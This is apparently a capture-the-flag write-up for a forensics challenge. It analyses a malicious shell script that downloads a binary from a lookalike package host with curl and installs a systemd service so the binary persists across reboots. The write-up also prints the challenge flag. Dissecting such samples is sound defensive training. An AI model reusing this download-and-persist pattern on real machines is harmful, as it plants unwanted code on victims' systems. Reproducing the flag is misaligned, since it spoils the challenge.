# WRITE_UP #

## Extraterrestrial Persistence ##

## 1. Analysis ##
* **Given:** a file named `persistence.sh`
* **Description:**
* **Hints:**   
    * No hints are given 

## 2. Investigation ##
### PERSISTENCEEEEE ###

Received the `.sh` file, I use `VSCode` to open it:

```sh
n=`whoami`
h=`hostname`
path='/usr/local/bin/service'
if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi

curl https://files.pypi-install.com/packeges/service -o $path

chmod +x $path

echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode > /usr/lib/systemd/system/service.service

systemctl enable service.service
```

First, the program uses `whoami` and `hostname` to check those two varibales, if those were different from `pandora` and `linux_HQ` respectively, the program automatically exits.

If it's the right user, the program will curl the `service` file from the `https://files.pypi-install.com/packeges/` into the `$path` which is `'/usr/local/bin/service'` then give it the permission to run. (they used `packeges` not `packages` to fool the careless ... (not me btw)).

Next, the program will echo a base64 string after decoding it to the `/usr/lib/systemd/system/service.service`
Decode the b64 strings, I got:

```
[Unit]
Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
After=network.target network-online.target

[Service]
Type=oneshot
RemainAfterExit=yes

ExecStart=/usr/local/bin/service
ExecStop=/usr/local/bin/service

[Install]
WantedBy=multi-user.target
```
These commands `ExecStart=/usr/local/bin/service` and `ExecStop=/usr/local/bin/service` make the malicious file being persistent in the victim's machine.

And the last line in the `.sh` file `systemctl enable service.service` config the service file to run automatically whenever the victim's machine boots. (I read abt it from these img)

![](2026-03-23_15-33.png)

![](2026-03-23_15-34.png)

Btw the flag is:  `HTB{th3s3_4l13nS_4r3_s00000_b4s1c}`.

## 3. Solution ##
1. **Result:** The flag is `HTB{th3s3_4l13nS_4r3_s00000_b4s1c}`


